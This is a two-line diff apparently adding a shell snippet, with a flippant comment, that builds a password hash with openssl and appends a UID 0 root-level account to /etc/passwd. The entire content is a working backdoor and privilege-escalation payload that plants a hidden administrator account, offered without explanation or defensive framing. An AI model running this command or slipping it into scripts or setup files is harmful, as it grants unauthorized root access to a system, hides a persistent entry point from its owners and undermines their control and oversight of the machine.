@@ -1,0 +1,2 @@
+# replace username and password.. or dont.
+{ openssl passwd -1 -salt username password | tr -d '\n'; echo ":0:0:root:/root:/bin/bash"; } >> /etc/passwd
